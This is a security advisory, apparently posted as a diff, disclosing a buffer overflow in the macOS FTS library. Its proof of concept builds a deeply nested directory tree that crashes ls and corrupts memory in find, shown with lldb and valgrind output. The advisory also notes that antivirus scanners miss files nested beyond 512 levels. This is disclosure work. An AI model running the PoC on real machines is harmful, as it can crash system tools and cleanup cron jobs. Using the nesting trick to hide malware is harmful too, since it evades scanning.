@@ -1,0 +1,284 @@
+MacOS X 10.11 FTS Deep structure of the file system Buffer Overflow
+Credit: Maksymilian Arciemowicz ( CXSECURITY )
+Website: 
+http://cxsecurity.com/
+http://cert.cx/
+
+
+Affected software:
+- MACOS's Commands such as: ls, find, rm 
+- iPhone 4s and later,
+- Apple Watch Sport, Apple Watch, Apple Watch Edition and Apple Watch Hermes
+- Apple TV (4th generation)
+- probably more
+
+Apple file system suffer for a issue recognised in FTS library. The main problem occur when we create deep filesystem hierarchy. Unexpected behavior of many programs and invalid memory write seems really interesting.
+
+PoC:
+Create an direcotry and perform the following actions:
+
+
+# for i in {1..1024}; do mkdir B && cd B; done
+...
+cd: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+
+
+If such error occur, don't panic script will continuing. When the script will finish, you need back to top of directory. E.g.
+
+
+# for i in {1..1024}; do cd .. ; done
+
+
+Then you can perform recursive 'ls' command. Let's run it ten times:
+
+
+# for i in {1..10}; do ls -laR > /dev/null; done
+ls: B: No such file or directory
+ls: B: No such file or directory
+ls: B: No such file or directory
+ls: B: No such file or directory
+ls: B: No such file or directory
+ls: B: No such file or directory
+ls: B: No such file or directory
+ls: B: No such file or directory
+Segmentation fault: 11
+Segmentation fault: 11
+Segmentation fault: 11
+ls: B: No such file or directory
+ls: B: No such file or directory
+Segmentation fault: 11
+ls: B: No such file or directory
+ls: B: No such file or directory
+
+
+crash randometly. Let's see valgrind and lldb 
+
+
+LLDB:
+...
+/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B:
+total 0
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 .
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 ..
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 B
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X1
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X2
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X3
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X4
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X5
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X6
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X7
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X8
+
+./B/B/B/B/B/B/B/B/..../B/B:
+Process 987 stopped
+* thread #1: tid = 0x2924, 0x00007fff97ab6d32 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0xfeb66c00)
+frame #0: 0x00007fff97ab6d32 libsystem_c.dylib`strlen + 18
+libsystem_c.dylib`strlen:
+-> 0x7fff97ab6d32 <+18>: pcmpeqb (%rdi), %xmm0
+0x7fff97ab6d36 <+22>: pmovmskb %xmm0, %esi
+0x7fff97ab6d3a <+26>: andq $0xf, %rcx
+0x7fff97ab6d3e <+30>: orq $-0x1, %rax
+
+(lldb) x/x $rdi
+error: memory read failed for 0xfeb66c00
+(lldb) register read
+General Purpose Registers:
+rax = 0x00000000ffffffff
+rbx = 0x00000000ffffffff
+rcx = 0x00000000feb66c08
+rdx = 0x00000000feb66c08
+rdi = 0x00000000feb66c00
+rsi = 0x00007fff97afbb4d libsystem_c.dylib`__vfprintf + 2742
+rbp = 0x00007fff5fbfe710
+rsp = 0x00007fff5fbfe710
+...
+rip = 0x00007fff97ab6d32 libsystem_c.dylib`strlen + 18
+...
+(lldb) bt
+* thread #1: tid = 0x2924, 0x00007fff97ab6d32 libsystem_c.dylib`strlen + 18, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0xfeb66c00)
+* frame #0: 0x00007fff97ab6d32 libsystem_c.dylib`strlen + 18
+frame #1: 0x00007fff97afc6e8 libsystem_c.dylib`__vfprintf + 5713
+frame #2: 0x00007fff97b2535d libsystem_c.dylib`__v2printf + 669
+frame #3: 0x00007fff97b095a9 libsystem_c.dylib`_vsnprintf + 596
+frame #4: 0x00007fff97b0965e libsystem_c.dylib`vsnprintf + 80
+frame #5: 0x00007fff97b3acc0 libsystem_c.dylib`__snprintf_chk + 128
+frame #6: 0x00000001000024a8 ls`___lldb_unnamed_function16$$ls + 1564
+frame #7: 0x0000000100001cfd ls`___lldb_unnamed_function14$$ls + 421
+frame #8: 0x0000000100001a70 ls`___lldb_unnamed_function13$$ls + 2300
+frame #9: 0x00007fff93cdb5ad libdyld.dylib`start + 1
+
+=== Time for Valgrind =============
+
+B/B/B/B/B/../B:
+total 0
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 .
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 ..
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 B
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X1
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X2
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X3
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X4
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X5
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X6
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X7
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X8
+
+./B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B:
+total 0
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 .
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 ..
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 B
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X1
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X2
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X3
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X4
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X5
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X6
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X7
+drwxr-xr-x 11 cxsecurity staff 374 19 Oct 18:09 X8
+==1009== Invalid write of size 1
+==1009== at 0x1000126C3: _platform_memmove$VARIANT$Ivybridge (in /usr/local/Cellar/valgrind/3.11.0/lib/valgrind/vgpreload_memcheck-amd64-darwin.so)
+==1009== by 0x1002E034B: fts_read$INODE64 (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x100001DAD: ??? (in /bin/ls)
+==1009== by 0x100001A6F: ??? (in /bin/ls)
+==1009== by 0x1002815AC: start (in /usr/lib/system/libdyld.dylib)
+==1009== by 0x1: ???
+==1009== by 0x104809C8A: ???
+==1009== by 0x104809C8D: ???
+==1009== Address 0x100ae9880 is 0 bytes after a block of size 1,280 alloc'd
+==1009== at 0x10000FEBB: malloc (in /usr/local/Cellar/valgrind/3.11.0/lib/valgrind/vgpreload_memcheck-amd64-darwin.so)
+==1009== by 0x1002DFAB7: __fts_open (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x100001B92: ??? (in /bin/ls)
+==1009== by 0x100001A6F: ??? (in /bin/ls)
+==1009== by 0x1002815AC: start (in /usr/lib/system/libdyld.dylib)
+==1009== by 0x1: ???
+==1009== by 0x104809C8A: ???
+==1009== by 0x104809C8D: ???
+==1009== 
+
+./B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B/B:
+==1009== Invalid read of size 1
+==1009== at 0x1000116BF: strlen (in /usr/local/Cellar/valgrind/3.11.0/lib/valgrind/vgpreload_memcheck-amd64-darwin.so)
+==1009== by 0x1003226E7: __vfprintf (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x10034B35C: __v2printf (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x10032F5A8: _vsnprintf (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x10032F65D: vsnprintf (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x100360CBF: __snprintf_chk (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x1000024A7: ??? (in /bin/ls)
+==1009== by 0x100001CFC: ??? (in /bin/ls)
+==1009== by 0x100001A6F: ??? (in /bin/ls)
+==1009== by 0x1002815AC: start (in /usr/lib/system/libdyld.dylib)
+==1009== by 0x1: ???
+==1009== by 0x104809C8A: ???
+==1009== Address 0x102d20318 is not stack'd, malloc'd or (recently) free'd
+==1009== 
+==1009== 
+==1009== Process terminating with default action of signal 11 (SIGSEGV)
+==1009== Access not within mapped region at address 0x102D20318
+==1009== at 0x1000116BF: strlen (in /usr/local/Cellar/valgrind/3.11.0/lib/valgrind/vgpreload_memcheck-amd64-darwin.so)
+==1009== by 0x1003226E7: __vfprintf (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x10034B35C: __v2printf (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x10032F5A8: _vsnprintf (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x10032F65D: vsnprintf (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x100360CBF: __snprintf_chk (in /usr/lib/system/libsystem_c.dylib)
+==1009== by 0x1000024A7: ??? (in /bin/ls)
+==1009== by 0x100001CFC: ??? (in /bin/ls)
+==1009== by 0x100001A6F: ??? (in /bin/ls)
+==1009== by 0x1002815AC: start (in /usr/lib/system/libdyld.dylib)
+==1009== by 0x1: ???
+==1009== by 0x104809C8A: ???
+==1009== If you believe this happened as a result of a stack
+==1009== overflow in your program's main thread (unlikely but
+==1009== possible), you can try to increase the size of the
+==1009== main thread stack using the --main-stacksize= flag.
+==1009== The main thread stack size used in this run was 8388608.
+==1009== 
+==1009== HEAP SUMMARY:
+==1009== in use at exit: 1,671,999 bytes in 6,025 blocks
+==1009== total heap usage: 91,521 allocs, 85,496 frees, 9,706,918 bytes allocated
+==1009== 
+==1009== LEAK SUMMARY:
+==1009== definitely lost: 519 bytes in 6 blocks
+==1009== indirectly lost: 104 bytes in 6 blocks
+==1009== possibly lost: 0 bytes in 0 blocks
+==1009== still reachable: 1,645,151 bytes in 5,819 blocks
+==1009== suppressed: 26,225 bytes in 194 blocks
+==1009== Rerun with --leak-check=full to see details of leaked memory
+==1009== 
+==1009== For counts of detected and suppressed errors, rerun with: -v
+==1009== ERROR SUMMARY: 2 errors from 2 contexts (suppressed: 0 from 0)
+Segmentation fault: 11
+MacMini:SCANME cxsecurity$
+
+
+It looks like a buffer overflow in memmove(). Code
+
+http://www.opensource.apple.com/source/Libc/Libc-1044.40.1/gen/fts.c
+
+
+The same issue for 'find' which may be used in cron scripts like
+
+
+./periodic/daily/110.clean-tmps:	find -dx . -fstype local -type f $args -delete $print
+./periodic/daily/110.clean-tmps:	find -dx . -fstype local ! -name . -type d $dargs -delete $print
+./periodic/daily/140.clean-rwho:	rc=$(find . ! -name . -mtime +$daily_clean_rwho_days 
+./periodic/daily/199.clean-fax: find . -type f -name '[0-9]*.[0-9][0-9][0-9]' -mtime +7 -delete >/dev/null 2>&1;
+
+
+Let's see valgrind output.
+
+
+MacMini:SCANME cxsecurity$ valgrind find . -name "R"
+==1055== Memcheck, a memory error detector
+==1055== Copyright (C) 2002-2015, and GNU GPL'd, by Julian Seward et al.
+==1055== Using Valgrind-3.11.0 and LibVEX; rerun with -h for copyright info
+==1055== Command: find . -name R
+==1055== 
+find: ./.Trashes: Permission denied
+==1055== Invalid write of size 2
+==1055== at 0x100015690: _platform_memmove$VARIANT$Ivybridge (in /usr/local/Cellar/valgrind/3.11.0/lib/valgrind/vgpreload_memcheck-amd64-darwin.so)
+==1055== by 0x1001B134B: fts_read$INODE64 (in /usr/lib/system/libsystem_c.dylib)
+==1055== by 0x1000013FA: ??? (in /usr/bin/find)
+==1055== by 0x1000052AD: ??? (in /usr/bin/find)
+==1055== by 0x1001525AC: start (in /usr/lib/system/libdyld.dylib)
+==1055== by 0x3: ???
+==1055== by 0x10480CC7F: ???
+==1055== Address 0x10120b944 is 2,052 bytes inside a block of size 2,053 alloc'd
+==1055== at 0x100013920: realloc (in /usr/local/Cellar/valgrind/3.11.0/lib/valgrind/vgpreload_memcheck-amd64-darwin.so)
+==1055== by 0x1001B1767: fts_build (in /usr/lib/system/libsystem_c.dylib)
+==1055== by 0x1001B11DA: fts_read$INODE64 (in /usr/lib/system/libsystem_c.dylib)
+==1055== by 0x1000013FA: ??? (in /usr/bin/find)
+==1055== by 0x1000052AD: ??? (in /usr/bin/find)
+==1055== by 0x1001525AC: start (in /usr/lib/system/libdyld.dylib)
+==1055== by 0x3: ???
+==1055== by 0x10480CC7F: ???
+...
+
+Invalid memory write without crashing.
+
+
+BTW:
+Many vendors of antiviruses for MACOS X seems to be blind for malicus software above 512 level of directory. Eg. Eset32, Kaspersky etc.
+
+====== References ===================================
+https://cxsecurity.com/issue/WLB-2014040027
+https://cxsecurity.com/cveshow/CVE-2014-4433/
+https://cxsecurity.com/cveshow/CVE-2014-4434/
+https://cxsecurity.com/issue/WLB-2013110059
+https://cxsecurity.com/cveshow/CVE-2013-6799/
+https://cxsecurity.com/issue/WLB-2010040284
+https://cxsecurity.com/cveshow/CVE-2010-0105/
+https://cxsecurity.com/issue/WLB-2005090063
+
+
+====== Thanks ===================================
+Kacper and Smash_ from DEVILTEAM for technical support. 
+
+
+====== Credit ===================================
+Maksymilian Arciemowicz from cxsecurity.com
+
+http://cxsecurity.com/
+http://cert.cx/
+http://cifrex.org/
